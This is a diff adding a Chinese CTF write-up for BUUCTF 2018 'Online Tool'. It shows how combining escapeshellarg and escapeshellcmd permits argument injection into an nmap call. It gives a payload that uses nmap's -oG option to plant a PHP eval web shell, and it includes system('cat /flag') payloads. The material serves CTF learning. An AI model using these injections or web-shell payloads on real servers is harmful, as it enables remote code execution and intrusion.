@@ -648,6 +648,80 @@ payload: next.php?\S*=${getFlag()}&&cmd=system('ls /');
 
 payload:next.php?\S*=${getFlag()}&&cmd=system('cat /flag'); 
 
+# [BUUCTF 2018]Online Tool 1
 
+## 知识
+
+函数escapeshellarg的作用是把字符串转码为可以在 shell 命令里使用的参数，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
+
+函数escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。
+
+反斜线（\）会在以下字符之前插入： &#;`|*?~<>^()[]{}$, \x0A 和 \xFF。 ’ 和 " 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。
+
+namp
+
+## WP
+
+```php
+<?php
+ 
+if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
+}
+ 
+if(!isset($_GET['host'])) {
+    highlight_file(__FILE__);
+} else {
+    $host = $_GET['host'];
+    $host = escapeshellarg($host);
+    //escapeshellarg
+    //1,确保用户值传递一个参数给命令
+    //2,用户不能指定更多的参数
+    //3,用户不能执行不同的命令
+    $host = escapeshellcmd($host);
+    //escapeshellcmd
+    //1,确保用户只执行一个命令
+    //2,用户可以指定不限数量的参数
+    //3,用户不能执行不同的命令
+    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
+    echo 'you are in sandbox '.$sandbox;
+    @mkdir($sandbox);
+    chdir($sandbox);
+    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
+```
+
+>$_SERVER 可以获取服务器和执行环境信息
+>HTTP_X_FORWARDED_FOR HTTP扩展头部，用来表示http请求端真实ip
+>REMOTE_ADDR代表客户端的IP，但它的值不是由客户端提供的，而是服务端根据客户端的ip指定的，当你的浏览器访问某个网站时，假设中间没有任何代理，那么网站的web服务器（Nginx，Apache等）就会把remote_addr设为你的机器IP，如果你用了某个代理，那么你的浏览器会先访问这个代理，然后再由这个代理转发到网站，这样web服务器就会把remote_addr设为这台代理机器的IP。
+
+代码整体功能：
+1. 首先判断客户端提供给服务器和服务器自动获取的ip是否一致。 
+2. 判断get host参数时候传值，没有传值高亮当前代码。 
+3. 传值，host传递参数经过escapeshellarg，escapeshellcmd函数的限制。 
+4. 以’glzjin’+ip通过md5加密形成值，并作为文件名创建文件，当前文件地址更改为创建的文件 
+5. 输出 system执行结果。
+
+我们需要构造能够得到flag的host语句。
+
+由escapeshellarg和escapeshellcmd可知,在host变量里面我们不能使用 ; & | 等符号来执行多条命令，不过题目里面提示了我们RCE，同时对于这两个函数简单查找了之后，发现两个一起使用的时候存在漏洞
+
+简单来说
+
+>传入的参数是：172.17.0.2' -v -d a=1
+>经过escapeshellarg处理后变成了'172.17.0.2'\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
+>经过escapeshellcmd处理后变成'172.17.0.2'\\'' -v -d a=1\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php
+>最后执行的命令是curl '172.17.0.2'\\'' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。
+
+所以经过我们构造之后，输入的值被分割成为了三部分，第一部分就是curl的IP，为172.17.0.2\  ，第二部分就是两个配对的单引号 ' ' ，第三部分就是命令参数以及对象 -v -d a=1'
+
+于是我们可以参数绕过这两个过滤函数
+
+同时，为了构造命令读取flag,我们应当从nmap入手，查资料可以知道，nmap有一个参数-oG可以实现将命令和结果写到文件
+
+所以我们可以控制自己的输入写入文件，这里我们可以写入一句话木马链接
+
+构造payload`?host=' <?= @eval($_POST["hack"]);?> -oG hack.php '`
+
+蚁剑连接得到flag
 
 
